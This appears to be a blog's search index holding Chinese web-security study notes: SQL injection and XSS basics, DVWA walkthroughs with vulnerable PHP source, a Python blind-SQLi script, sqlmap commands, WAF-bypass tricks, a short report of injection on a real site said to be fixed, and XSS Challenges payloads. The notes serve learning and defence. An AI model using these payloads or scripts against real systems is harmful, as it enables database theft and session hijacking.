{"pages":[{"title":"About","date":"2020-05-20T11:45:55.229Z","path":"about/index.html","text":""},{"title":"Categories","date":"2020-05-20T11:45:55.229Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2020-05-20T11:45:55.229Z","path":"tags/index.html","text":""}],"posts":[{"title":"sql注入基础学习","date":"2020-06-13T02:57:19.000Z","path":"wiki/学习笔记/Web安全学习笔记/SQLi/sqli基础/","text":"sql注入基础学习sql注入定义&amp;原理Web应用程序对用户输入的合法性没有判断，参数可控，并带入数据库查询，导致攻击者可以通过构造不同的SQL语句来实现对数据库的操作 任何提交给服务器的数据都可能会被传送给数据库函数，并且可能得到不安全的处理 MySQL基础Mysql在version 5以后，便多了一个基础库information_schema，存储的的是mysql的结构信息。除此以外，Mysql还拥有一个只有root权限才能访问的mysql库。 常用查询语句： 12345678/*查库*/select schema_name from information_schema.schemata;/*查表*/select table_name from information_schema.tables where table_schema=\"库名\";/*查列*/select column_name from information_schema.columns where table_name=\"表名\";/*查数据*/select 列名 from '库名.表名' limit 0,1; sqlmap工具使用语句： 12345678910111213sqlmap -u [url] --dbs # 列出数据库sqlmap -u [url] -D [db_name] --tables # 列出某库中的表名sqlmap -u [url] -D [db_name] -T [table_name] --columns # 列出列名sqlmap -u [url] -D [db_name] -T [table_name] -C [colunms_name] --dump # 列出数据其他几个参数-m filename # 可将获取的信息保存到文件--method POST # 使用POST提交--data \"id=1&amp;ip=2\" # 提交的数据-P id # 指定测试的参数--cookie # 指定cookie--sql-query=SQL语句 # 执行sql语句--sql-shell # 获得可交互的shell--sql-file=sql_file # 执行文件中的sql语句 MySQL中 的注释： 12345# Hash语法/* C-Style语法--+ SQL语法;%00 空字节` 反引号 其中有个特殊情况，例如： 1http://localhost/Less-1/?id=-1' union select 1,(/*!50095select user()*/),3--+ MySQL在注释/**/中间加个感叹号，后面跟上版本号，就可以在当前数据库版本高于或等于该指定版本的时候进行执行里面的sql指令。 sql注入渗透流程信息收集–&gt;数据获取–&gt;提权： 信息收集 获取注入点回显位置： 列数：order/group by n–+ 位置：union select 1,2,3,..,n–+ 数据库类型&amp;版本 报错信息 函数：version(),@@version 数据库用户 函数：user() （mysql） 函数：SYSTEM_USER (SQLServer) 数据库权限 super_priv() 数据获取 获取库信息 获取表信息 获取列信息 获取数据 提权 执行命令 读文件（中间件&amp;数据库配置文件） 写文件（写入webshell） sql注入类型&amp;探测按注入点来分： 数字型：可控参数在sql语句是数字类型 12345678910111213通过如下语句来判断是否存在SQL注入and 1 Trueand 0 Falseand ture Tureand false False1-false return 1 if vulnerable1-true return 0 if vulnerable使用运算符来进行判断1*2 return 2 if vulnerable1*2 return 1 if not vulnerable 字符型：可控参数在sql语句是字符类型 123456789通过如下语句来判断是否存在SQL注入&#39; False&#39;&#39; True&quot; False&quot;&quot; True\\ False\\\\ True 12可以尽量使用多个引号，可能可以绕过语法检测，例如：SELECT 1 FROM user_info WHERE 1 &#x3D; &#39;1&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;2&#39;; 登陆型 12345678/*万能密码：*/' OR '1' OR 1 --\" OR \"\" = \"\" OR 1 = 1 --'=''LIKE''=0-- 按数据提交来分： 安装注入点的位置来区分的 GET注入 POST注入 Cookie注入 HTTP头注入 按执行效果来分： 联合注入：普通情况常用 1UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database(); 报错注入：用于存在注入没有回显，但显示报错 12/*XPath语法错误报错*/select ExtractValue(1, CONCAT(0x5c, (SELECT @@version))) 12/*XPath语法错误报错*/select updatexml(1,concat(0x7e,(select user()),0x7e),1) 12/*group by 对rand()函数产生报错*/select count(*) from information_schema.schemata group by concat((select user()),floor(rand(0)*2)) 盲注：用于存在注入但是没有回显，也没有报错的场合 布尔盲注：先判断长度，再判断字符是啥 12/*判断长度*/select length(database())&gt;6 123/*使用left()*/select left(database(),2)='su'从左边截取前几位，进行比较，返回1则正确，0则错误 12/*使用regexp*/待更新 12/*使用like*/待更新 123/*使用substr()和ascii()*/select ascii(substr((select database()),1,1))=0x73从左边第1个字符截取1个字符转换成ascii码格式然后进行比较 123/*ord()与mid()*/select ord(mid((select database()),1,1)=0x73原理同上 时间盲注 12/*在布尔盲注的基础上使用if来判断注入是否成功*/select if(ord(mid((select database()),1,1)=0x73),sleep(5),null) 堆叠查询注入 12/*通过；来执行多条sql语句*/1'; select if(substr((select database()),1,1)&gt;115),sleep(2),null%23 二次注入：数据存入数据库时进行了过滤，但取出时过滤不到位导致取出时发生sql注入 宽字节注入：数据库编码位GBK时，可用%df’来绕过给单引号加反斜杠的过滤 因为编码问题，GBK编码可以吃掉ASCII的一个字符 绕过 大小写绕过 双写绕过 编码绕过：进行两次url编码 内联注释绕过：/*!*/ 修复建议 过滤危险字符 使用PDO预编译语句 DVWA SQLiSQL Injection：Low 源代码： 12345678910111213141516171819202122 &lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Get values $first = mysql_result( $result, $i, \"first_name\" ); $last = mysql_result( $result, $i, \"last_name\" ); // Feedback for end user echo \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; // Increase loop count $i++; &#125; mysql_close();&#125;?&gt; sql语句为如下：id参数为字符类型，可控 1SELECT first_name, last_name FROM users WHERE user_id = '$id'; payload： 1-1&#39; union select 1,2-- SQL Injection：Medium 源代码： 1234567891011121314151617181920212223&lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysql_real_escape_string( $id ); // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Display values $first = mysql_result( $result, $i, \"first_name\" ); $last = mysql_result( $result, $i, \"last_name\" ); // Feedback for end user echo \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; // Increase loop count $i++; &#125; //mysql_close();&#125;?&gt; sql语句为如下：id参数为数字类型，可控 1SELECT first_name, last_name FROM users WHERE user_id = $id; Payload： 1id&#x3D;1111 union select 1,2%23 SQL Injection：High 源代码： 12345678910111213141516171819202122&lt;?phpif( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Get values $first = mysql_result( $result, $i, \"first_name\" ); $last = mysql_result( $result, $i, \"last_name\" ); // Feedback for end user echo \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; // Increase loop count $i++; &#125; mysql_close();&#125;?&gt; 带入的SQL语句如下，id参数为字符类型,与上次不同的地方在于最后多了一个查询数量的限制： 1SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1; Payload： 11&#39; union select 1,(select database())--+ 如果要查询多条数据可使用concat函数进行合并，或者进行多次查询 SQL Injection：Impossible源代码： 1234567891011121314151617181920212223242526&lt;?phpif( isset( $_GET[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; GET获取参数id，判断id是否时数字，如果是，PDO预编译再查询，没办法弄 SQL Injection Blind：Low源代码： 12345678910111213141516171819202122&lt;?phpif( isset( $_GET[ 'Submit' ] ) ) &#123; // Get input $id = $_GET[ 'id' ]; // Check database $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The '@' character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; mysql_close();&#125;?&gt; GET获取参数id，带入SQL查询，查询成功与不成功回显不一样，可选择布尔盲注 SQL语句： 1SELECT first_name, last_name FROM users WHERE user_id = '$id'; 盲注Python脚本：获取数据库名称 123456789101112131415161718192021222324252627282930313233import requestsdef header(cookie: str): headers = &#123; 'cookie': f'&#123;cookie&#125;', 'Host': 'localhost', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0' &#125; return headersdef dblength(url, headers): for i in range(0,100): payload = f\"1'+and+length(database())=&#123;i&#125;--+&amp;Submit=Submit#\" response = requests.get(url+payload, headers=headers) if 'exists' in response.text: return iif __name__ == '__main__': url = 'http://localhost/vulnerabilities/sqli_blind/?id=' cookie = 'PHPSESSID=fnt82ncr1rka6440pcij663fb1; security=low' headers = header(cookie) db_length = dblength(url, headers) db_name = '' for _ in range(0, db_length+1): for i in range(1, 127): payload = f\"1'+and+ascii(substr((select+database()),&#123;_&#125;,1))=&#123;i&#125;--+&amp;Submit=Submit#\" response = requests.get(url+payload, headers=headers) if 'exist' in response.text: db_name += chr(i) print(f'database name：&#123;db_name&#125;') sqlmap: 1python .\\sqlmap.py -u \"http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit\" --cookie \"PHPSESSID=4bclqqpo197c8j99gnchr8iv90; security=low\" SQL Injection Blind：Medium源代码： 123456789101112131415161718192021&lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysql_real_escape_string( $id ); // Check database $getid = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The '@' character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; //mysql_close();&#125;?&gt; 参数通过post提交，通过mysql_real_escape_string()函数过滤，代入sql语句中，数字型，查询成功和失败有不同的回显 单双引号被过滤了 SQL查询语句为数字型如下，不需要引号即可注入 1SELECT first_name, last_name FROM users WHERE user_id = $id; payload形如： 11+and+length((select+database()))&gt;0--+ python盲注脚本：获取数据库名称： 1这里不知道为啥，我构造的请求包和burp发送的包是一样的，但是请求结果不一样，回头再来填坑，希望有遇到过这个问题的老哥能指点一二 sqlmap： 1python .\\sqlmap.py -u http://localhost/vulnerabilities/sqli_blind/ --cookie \"PHPSESSID=4bclqqpo197c8j99gnchr8iv90; security=medium\" --method post --data \"id=1&amp;Submit=Submit\" SQL Injection Blind：High源代码： 1234567891011121314151617181920212223242526&lt;?phpif( isset( $_COOKIE[ 'id' ] ) ) &#123; // Get input $id = $_COOKIE[ 'id' ]; // Check database $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The '@' character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // Might sleep a random amount if( rand( 0, 5 ) == 3 ) &#123; sleep( rand( 2, 4 ) ); &#125; // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; mysql_close();&#125;?&gt; 从cookie中获取id，这里通过一个界面来设置cookie，然后通过另外一个界面来根据cookie来显示内容，这里只要改变cookie中id参数的值，即可实现注入 python盲注脚本： 1回头填坑 sqlmap： 1python .\\sqlmap.py -u http://localhost/vulnerabilities/sqli_blind/ --cookie \"id=1; PHPSESSID=4bclqqpo197c8j99gnchr8iv90; security=high\" --level 2 SQL Injection Blind：Impossible源代码： 12345678910111213141516171819202122232425262728&lt;?phpif( isset( $_GET[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 先判断id是不是数字，不是就不进行查询，然后使用PDO使数据代码分开，无解","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Web安全学习笔记","slug":"学习笔记/Web安全学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLi","slug":"学习笔记/Web安全学习笔记/SQLi","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/"}]},{"title":"XSS基础学习","date":"2020-06-12T02:57:19.000Z","path":"wiki/学习笔记/Web安全学习笔记/XSS/XSS基础/","text":"XSS基础学习XSS定义原理：利用网站对用户输入、网站输出过滤不足的缺陷，构造能够对其他用户造成影响的html代码，从而对访问者造成侵害。 （以下内容来自百度百科） XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 XSS分类反射型XSS：恶意脚本存在用户访问的链接上，网站通过链接上的参数来生成内容导致反射型XSS，通常位一次性，隐蔽性低，使用的时候需要进行混淆 存储型XSS：恶意脚本存在服务器上，用户通过访问该网页就会触发，隐蔽性高 DOM型XSS：属于一种特殊的反射型XSS，基于DOM对象模型，客户端可通过DOM动态修改页面内容，通过专门设计的URL使目标访问来触发 常用的测试语句1&lt;script&gt;alert`1`&lt;/script&gt; 1&lt;img src=x onerror=alert`1`&gt; 1&lt;svg/onload=alert(1)&gt; 1&lt;a href=javascript:alert(1)&gt; 修复建议对于输入： 过滤&#39;,&quot;,&lt;,&gt;,on*等非法字符 对于输出 对输出到页面的数据进行相应的编码转换，包括HTML实体编码、Javascript编码等 DVWA XSSReflected：Low 源代码： 1234567&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; array_key_exists(key，array) 函数的功能是：检查键名是否存在数组中 例如： 1234567891011&lt;?php$a=array(\"Volvo\"=&gt;\"XC90\",\"BMW\"=&gt;\"X5\");if (array_key_exists(\"Volvo\",$a)) &#123; echo \"键存在！\"; &#125;else &#123; echo \"键不存在！\"; &#125;?&gt; 1运行结果：键存在 输入框的输入的值通过GET方法提交到服务器，服务端仅检测此值是否存在，存在就直接打印出来 所以构造payload： 1&lt;/pre&gt;&lt;svg/onload=alert`1`&gt;&lt;pre&gt; 就会触发 Reflected：Medium源代码： 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; str_replace(find,replace,string,count) 函数的作用是，将字符串中的值替换成另一个值，可以选择替换几个 示例： 123&lt;?phpecho str_replace(\"world\",\"Shanghai\",\"Hello world!\");?&gt; 1运行结果：Hello Shanghai! 这里比上次多了一行代码，将name的值里面的&lt;script&gt;转换成空字符，只要构造语句里没有&lt;script&gt;，或者使用大小写，即可绕过该条限制 Payload： 1&lt;/pre&gt;&lt;scriPT&gt;alert`1`&lt;/scriPT&gt;&lt;pre&gt; 或者： 1&lt;/pre&gt;&lt;svg/onload=alert`1`&gt;&lt;pre&gt; Reflected：High源代码： 123456789&lt;?php&#x2F;&#x2F; Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; &#x2F;&#x2F; Get input $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); &#x2F;&#x2F; Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;&#125;?&gt; preg_replace 函数执行一个正则表达式的搜索和替换。 这里的正则表达式的含义是匹配script字符串，只要没出现就行 payload与之前一样： 1&lt;/pre&gt;&lt;svg/onload=alert`1`&gt;&lt;pre&gt; Reflected：Impossible源代码： 12345678910111213&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; htmlspecialchars()函数的功能是：把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体，即浏览器是把这玩意认为是字符而不是html标签的尖括号 就过滤XSS代码而言，Impossible难度使用htmlspecialchars函数进行过滤，让&lt;&gt;尖括号失效，在这种场合，XSS也就不存在了，除非能绕过该函数的过滤 Stored：Low 源代码： 12345678910111213141516&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; trim()：函数用于删除两侧空格 stripslashes()：函数用于删除反斜杠，用于清理从html表单或数据库取回的数据 mysql_real_escape_string()：函数转义字符串中的特殊字符（用在SQL语句的） die() ：函数输出一条消息，并退出当前脚本 程序将POST接收到的数据进行转义，然后插入数据库中，再次访问网页的时候，数据从数据库取出来输出在网页上。 这里的转义只是转义SQL中的特殊字符，所以&lt;&gt;还能用 payload： 1&lt;svg/onload=alert`1`&gt; 可绕过前端输入框长度限制放在name里或者直接放在Message输入框里均可 Stored：Medium源代码： 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '&lt;script&gt;', '', $name ); $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; strip_tags()：函数功能是让字符串中的html，xml，php标签变成空字符 Medium与Low相比，Medium过滤有些许变化，给Message字符串的特殊字符加反斜杠转义，然后再转义sql特殊字符，然后再转义尖括号&lt;&gt;；对name字符串则只是将&lt;script&gt;字符串过滤掉，大小写或者使用其他标签可绕过，然后过滤sql特殊字符，但是name输入框有最大长度限制，因为限制在前端，所以很好绕过。 payload： 1&lt;ScRiPt&gt;alert(\"`\")&lt;/ScriPT&gt; Stored：High源代码： 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 与之前Medium不同的是对name字符串的过滤不一样了，这次使用正则匹配script字符，不能用大小写绕过了，那就换个标签来即可 payload： 1&lt;svg/onload=alert`1`&gt; Stored：Impossible源代码： 12345678910111213141516171819202122232425&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = mysql_real_escape_string( $name ); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这里使用PDO来防止SQL注入 对name和message采用了同样的方式来防止XSS Anti-CSRF token机制有效防止了CSRF","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Web安全学习笔记","slug":"学习笔记/Web安全学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSS","slug":"学习笔记/Web安全学习笔记/XSS","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/"}]},{"title":"Index","date":"2020-06-12T01:44:03.000Z","path":"wiki/index/","text":"To Do List： 学习汇编基础 把以前博客的文章迁移过来 将纸质笔记打成电子版 从基础开始将Web安全相关内容再次学习，并完善博客","tags":[],"categories":[]},{"title":"某网站存在事件型sql注入01","date":"2020-06-11T01:36:11.000Z","path":"wiki/学习笔记/Web安全学习笔记/SQLi/实战/某网站存在事件型sql注入01/","text":"某网站前台存在多处事件型sql注入01 本文提到的漏洞以提交到SRC，厂家已将漏洞修复。 随意浏览网站的时候，发现了一个网站上面的id很吸引人 随手在后面加个and 1=2--+，居然拦截了！ 发现这是WTS-WAF应用防火墙，那去搜搜有没有相关的绕过技术，了解到这玩意是检测空格的，只要把空格换成+号即可，+号在url里也起到空格的作用，再来一次：+and+1=2--+ 网站页面的内容消失了！成，这里十有八九存在sql注入漏洞。 使用order+by+11--+测得字段数 简单实用union select验证漏洞确实存在 本网站还存在多处类似的漏洞，只是回显的地方不一样","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Web安全学习笔记","slug":"学习笔记/Web安全学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLi","slug":"学习笔记/Web安全学习笔记/SQLi","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/"},{"name":"实战","slug":"学习笔记/Web安全学习笔记/SQLi/实战","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/%E5%AE%9E%E6%88%98/"}]},{"title":"XSS_Challenges Write Up","date":"2020-06-10T12:57:19.000Z","path":"wiki/学习笔记/Web安全学习笔记/XSS/练习平台/XSS_Challenges/","text":"XSS Challenges Write Up stage #1直接闭合标签+构造标签即可 1&lt;/b&gt;&lt;svg/onload=alert(document.domain)&gt;&lt;b&gt; stage #2闭合双引号+闭合标签+构造标签 1\"&gt;&lt;svg/onload= alert(document.domain)&gt;&lt; stage #3唯一的注入点在b标签里，双引号和尖括号被转义了 但是发现后面那个选项框的内容也会被打印出来，所以抓包构造payload即可： 1p1=sda&amp;p2=Japan&lt;svg/onload=alert(document.domain)&gt; stage #4和stage3类似，参数p1和p2都被转义了，但是有个隐藏的p3可控，抓包修改p3构造payload即可： 1p1=asd&amp;p2=Japan&amp;p3=hacxxxxx\"&gt;&lt;svg/onload=alert(document.domain)&gt; stage #5输入的值会原样留在输入框内,输入长度有限制，F12审查元素把限制长度改了，然后构造payload闭合尖括号即可： 1\"&gt;&lt;svg/onload=alert(document.domain)&gt; stage #6与stage5相比，尖括号变成html实体字符，但是双引号可控，可给input标签加个事件监听 1\" onchange=alert(document.domain)\" 提交完之后，随便输入个啥，来让input标签的值发生变化，从而触发XSS stage #7与Stage5相比，双引号和尖括号全都被转义，在html中，除了双引号，空格也能分隔属性 payload： 11 onchange=alert(document.domain) stage #8这次的输出是输出在a标签的href里，通过JavaScript伪协议来让链接点击触发XSS 1javascript:alert(document.domain) stage #9utf-7 XSS，这玩意需要IE7浏览器，基本遇不到了，我这也没这环境，就用控制台跳过了 stage #10http://xss-quiz.int21h.jp/stage00010.php?sid=8f2801ef982d78f46ef7796eae24548546390031","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Web安全学习笔记","slug":"学习笔记/Web安全学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSS","slug":"学习笔记/Web安全学习笔记/XSS","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/"},{"name":"练习平台","slug":"学习笔记/Web安全学习笔记/XSS/练习平台","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0